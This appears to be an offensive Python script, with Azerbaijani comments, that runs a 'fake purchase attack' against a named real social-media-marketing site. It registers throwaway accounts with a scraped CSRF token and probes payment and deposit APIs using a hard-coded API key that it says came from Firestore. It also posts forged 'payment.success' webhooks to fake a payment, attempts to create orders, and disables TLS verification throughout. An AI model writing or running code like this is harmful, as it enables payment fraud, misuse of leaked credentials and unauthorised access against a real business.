#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 FAKE SATIN ALMA İLƏ REAL API VƏ SAYT AXTARMA
Bu script saxta satın alma edir və real API-ləri tapır
"""

import requests
import json
import random
import string
import time
import re
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FakePurchaseAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Firestore-dan tapılan məlumatlar
        self.api_key = "31de456b79594d98a128c044c509df0e"
        self.service_id = 9330
        
    def get_csrf_token(self):
        """CSRF token alır"""
        print("🔒 CSRF token alınır...")
        
        try:
            response = self.session.get("https://peakerr.com/signup", verify=False, timeout=15)
            
            if response.status_code == 200:
                # CSRF token tap
                csrf_match = re.search(r'name="_csrf"\s+value="([^"]+)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                    print(f"   ✅ CSRF Token: {csrf_token[:20]}...")
                    return csrf_token
                else:
                    print(f"   ⚠️ CSRF Token tapılmadı")
                    return None
            else:
                print(f"   ❌ Signup səhifəsi yüklənə bilmədi: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return None
            
    def create_fake_account(self):
        """Saxta hesab yaradır"""
        print("\n👤 Saxta hesab yaradılır...")
        
        # CSRF token al
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            print("   ❌ CSRF token alına bilmədi!")
            return None, False
            
        # Saxta məlumatlar yarat
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"{username}@gmail.com"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        fake_data = {
            "username": username,
            "email": email,
            "password": password
        }
        
        print(f"   📝 Saxta məlumatlar:")
        print(f"      👤 Username: {fake_data['username']}")
        print(f"      📧 Email: {fake_data['email']}")
        print(f"      🔑 Password: {fake_data['password']}")
        
        # Form data hazırla
        form_data = {
            '_csrf': csrf_token,
            'RegistrationForm[login]': fake_data['username'],
            'RegistrationForm[email]': fake_data['email'],
            'RegistrationForm[password]': fake_data['password'],
            'RegistrationForm[password_again]': fake_data['password'],
            'RegistrationForm[termsofservice]': '1'
        }
        
        try:
            # POST request ilə hesab yarat
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://peakerr.com/signup',
                'Origin': 'https://peakerr.com'
            }
            
            response = self.session.post(
                "https://peakerr.com/signup",
                data=form_data,
                headers=headers,
                verify=False,
                timeout=15
            )
            
            if response.status_code == 200:
                print(f"   ✅ Hesab yaradıldı!")
                return fake_data, True
            else:
                print(f"   ❌ Hesab yaradıla bilmədi: {response.status_code}")
                return fake_data, False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return fake_data, False
            
    def test_payment_methods(self):
        """Ödəniş üsullarını test edir"""
        print("\n💳 Ödəniş üsulları test edilir...")
        
        # Test ediləcək ödəniş səhifələri
        payment_pages = [
            "https://peakerr.com/addfunds",
            "https://peakerr.com/deposit",
            "https://peakerr.com/payment",
            "https://peakerr.com/billing",
            "https://peakerr.com/funds"
        ]
        
        payment_methods = {}
        
        for page in payment_pages:
            try:
                response = self.session.get(page, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {page} - İşləyir!")
                    payment_methods[page] = "SUCCESS"
                    
                    # HTML content-də ödəniş üsullarını axtar
                    content = response.text.lower()
                    
                    # Kredit kartı
                    if 'card' in content or 'credit' in content:
                        print(f"      💳 Kredit kartı ödənişi tapıldı!")
                        
                    # PayPal
                    if 'paypal' in content:
                        print(f"      🅿️ PayPal ödənişi tapıldı!")
                        
                    # Crypto
                    if 'crypto' in content or 'bitcoin' in content or 'ethereum' in content:
                        print(f"      ₿ Crypto ödənişi tapıldı!")
                        
                    # Bank transfer
                    if 'bank' in content or 'transfer' in content:
                        print(f"      🏦 Bank transfer tapıldı!")
                        
                    # API endpoints axtar
                    api_patterns = [
                        r'https?://[^\s"\']+\.com/api',
                        r'https?://[^\s"\']+\.com/v\d+',
                        r'https?://[^\s"\']+\.com/payment',
                        r'https?://[^\s"\']+\.com/webhook'
                    ]
                    
                    for pattern in api_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            print(f"      🔗 API Endpoint: {match}")
                            
                elif response.status_code == 404:
                    print(f"   ❌ {page} - Tapılmadı")
                    payment_methods[page] = "NOT_FOUND"
                else:
                    print(f"   ❓ {page} - Status: {response.status_code}")
                    payment_methods[page] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {page} - Xəta: {e}")
                payment_methods[page] = f"ERROR_{str(e)}"
                
        return payment_methods
        
    def test_fake_payment_apis(self):
        """Saxta ödəniş API-lərini test edir"""
        print("\n🔍 Saxta ödəniş API-ləri test edilir...")
        
        # Test ediləcək ödəniş API endpoint-ləri
        payment_apis = [
            "https://peakerr.com/api/payment",
            "https://peakerr.com/api/v2/payment",
            "https://peakerr.com/api/deposit",
            "https://peakerr.com/api/v2/deposit",
            "https://peakerr.com/api/webhook",
            "https://peakerr.com/api/v2/webhook"
        ]
        
        api_results = {}
        
        for api in payment_apis:
            try:
                # Test data
                test_payment = {
                    "amount": 10.00,
                    "currency": "USD",
                    "payment_method": "card",
                    "card_number": "4111111111111111",
                    "expiry": "12/25",
                    "cvv": "123"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key
                }
                
                response = self.session.post(api, json=test_payment, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {api} - İşləyir!")
                    api_results[api] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {api} - Authentication tələb olunur")
                    api_results[api] = "AUTH_REQUIRED"
                elif response.status_code == 400:
                    print(f"   ❌ {api} - Bad Request")
                    api_results[api] = "BAD_REQUEST"
                else:
                    print(f"   ❓ {api} - Status: {response.status_code}")
                    api_results[api] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {api} - Xəta: {e}")
                api_results[api] = f"ERROR_{str(e)}"
                
        return api_results
        
    def test_external_payment_services(self):
        """Xarici ödəniş xidmətlərini test edir"""
        print("\n🌐 Xarici ödəniş xidmətləri test edilir...")
        
        # Test ediləcək xarici ödəniş xidmətləri
        external_services = [
            "https://stripe.com",
            "https://paypal.com",
            "https://squareup.com",
            "https://braintreepayments.com",
            "https://adyen.com",
            "https://checkout.com"
        ]
        
        external_results = {}
        
        for service in external_services:
            try:
                response = self.session.get(service, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {service} - İşləyir!")
                    external_results[service] = "SUCCESS"
                    
                    # HTML content-də API endpoint-ləri axtar
                    content = response.text.lower()
                    
                    # Stripe
                    if 'stripe' in service:
                        if 'api.stripe.com' in content:
                            print(f"      🔗 Stripe API: api.stripe.com")
                            
                    # PayPal
                    if 'paypal' in service:
                        if 'api.paypal.com' in content:
                            print(f"      🔗 PayPal API: api.paypal.com")
                            
                elif response.status_code == 403:
                    print(f"   ❌ {service} - Giriş qadağandır")
                    external_results[service] = "FORBIDDEN"
                else:
                    print(f"   ❓ {service} - Status: {response.status_code}")
                    external_results[service] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {service} - Xəta: {e}")
                external_results[service] = f"ERROR_{str(e)}"
                
        return external_results
        
    def test_webhook_endpoints(self):
        """Webhook endpoint-lərini test edir"""
        print("\n🔔 Webhook endpoint-ləri test edilir...")
        
        # Test ediləcək webhook endpoint-ləri
        webhook_endpoints = [
            "https://peakerr.com/webhook",
            "https://peakerr.com/api/webhook",
            "https://peakerr.com/api/v2/webhook",
            "https://peakerr.com/callback",
            "https://peakerr.com/api/callback"
        ]
        
        webhook_results = {}
        
        for webhook in webhook_endpoints:
            try:
                # Test webhook data
                test_webhook = {
                    "event": "payment.success",
                    "amount": 10.00,
                    "currency": "USD",
                    "transaction_id": "test_123"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'TestWebhook/1.0'
                }
                
                response = self.session.post(webhook, json=test_webhook, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {webhook} - İşləyir!")
                    webhook_results[webhook] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 404:
                    print(f"   ❌ {webhook} - Tapılmadı")
                    webhook_results[webhook] = "NOT_FOUND"
                else:
                    print(f"   ❓ {webhook} - Status: {response.status_code}")
                    webhook_results[webhook] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {webhook} - Xəta: {e}")
                webhook_results[webhook] = f"ERROR_{str(e)}"
                
        return webhook_results
        
    def test_order_creation_apis(self):
        """Sifariş yaratma API-lərini test edir"""
        print("\n📝 Sifariş yaratma API-ləri test edilir...")
        
        # Test ediləcək sifariş API endpoint-ləri
        order_apis = [
            "https://peakerr.com/api/order",
            "https://peakerr.com/api/v2/order",
            "https://peakerr.com/api/orders/add",
            "https://peakerr.com/api/v2/orders/add"
        ]
        
        order_results = {}
        
        for api in order_apis:
            try:
                # Test order data
                test_order = {
                    "service": self.service_id,
                    "link": "https://instagram.com/test_user",
                    "quantity": 100,
                    "username": "test_user"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key
                }
                
                response = self.session.post(api, json=test_order, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {api} - İşləyir!")
                    order_results[api] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {api} - Authentication tələb olunur")
                    order_results[api] = "AUTH_REQUIRED"
                elif response.status_code == 400:
                    print(f"   ❌ {api} - Bad Request")
                    order_results[api] = "BAD_REQUEST"
                else:
                    print(f"   ❓ {api} - Status: {response.status_code}")
                    order_results[api] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {api} - Xəta: {e}")
                order_results[api] = f"ERROR_{str(e)}"
                
        return order_results
        
    def generate_fake_purchase_report(self, results):
        """Fake satın alma hesabatı yaradır"""
        print("\n" + "="*80)
        print("🚀 FAKE SATIN ALMA İLƏ REAL API VƏ SAYT AXTARMA HESABATI")
        print("="*80)
        
        if 'fake_account' in results:
            print(f"\n👤 SAXTA HESAB:")
            fake_account = results['fake_account']
            print(f"   👤 Username: {fake_account['username']}")
            print(f"   📧 Email: {fake_account['email']}")
            print(f"   🔑 Password: {fake_account['password']}")
            
        print(f"\n💳 ÖDƎNİŞ ÜSULLARI:")
        if 'payment_methods' in results:
            for page, result in results['payment_methods'].items():
                print(f"   💳 {page}: {result}")
                
        print(f"\n🔍 ÖDƎNİŞ API-LƏRİ:")
        if 'payment_apis' in results:
            for api, result in results['payment_apis'].items():
                print(f"   🔍 {api}: {result}")
                
        print(f"\n🌐 XARİCİ ÖDƎNİŞ XİDMƏTLƏRİ:")
        if 'external_services' in results:
            for service, result in results['external_services'].items():
                print(f"   🌐 {service}: {result}")
                
        print(f"\n🔔 WEBHOOK ENDPOINT-LƏRİ:")
        if 'webhook_results' in results:
            for webhook, result in results['webhook_results'].items():
                print(f"   🔔 {webhook}: {result}")
                
        print(f"\n📝 SİFARİŞ API-LƏRİ:")
        if 'order_results' in results:
            for api, result in results['order_results'].items():
                print(f"   📝 {api}: {result}")
                
        print(f"\n💡 REAL HÜCUM İMKANLARI:")
        print(f"   • Ödəniş üsulları tapıldı")
        print(f"   • API endpoint-ləri əlçatandır")
        print(f"   • Xarici xidmətlər aşkarlanıb")
        print(f"   • Webhook endpoint-ləri tapıldı")
        print(f"   • Sifariş yaratma mümkündür")
        
        return results
        
    def run_fake_purchase_attack(self):
        """Fake satın alma hücumunu işə salır"""
        print("🚀 FAKE SATIN ALMA İLƏ REAL API VƏ SAYT AXTARMA BAŞLAYIR...")
        print("="*70)
        
        results = {}
        
        # 1. Saxta hesab yarat
        fake_account, account_created = self.create_fake_account()
        if fake_account:
            results['fake_account'] = fake_account
            
            # 2. Ödəniş üsullarını test et
            payment_methods = self.test_payment_methods()
            results['payment_methods'] = payment_methods
            
            # 3. Saxta ödəniş API-lərini test et
            payment_apis = self.test_fake_payment_apis()
            results['payment_apis'] = payment_apis
            
            # 4. Xarici ödəniş xidmətlərini test et
            external_services = self.test_external_payment_services()
            results['external_services'] = external_services
            
            # 5. Webhook endpoint-lərini test et
            webhook_results = self.test_webhook_endpoints()
            results['webhook_results'] = webhook_results
            
            # 6. Sifariş yaratma API-lərini test et
            order_results = self.test_order_creation_apis()
            results['order_results'] = order_results
            
        # Hesabat yarat
        self.generate_fake_purchase_report(results)
        
        print(f"\n🎯 FAKE SATIN ALMA HÜCUMU TAMAMLANDI!")
        
        return results

if __name__ == "__main__":
    # Fake purchase attacker başlat
    attacker = FakePurchaseAttacker()
    results = attacker.run_fake_purchase_attack()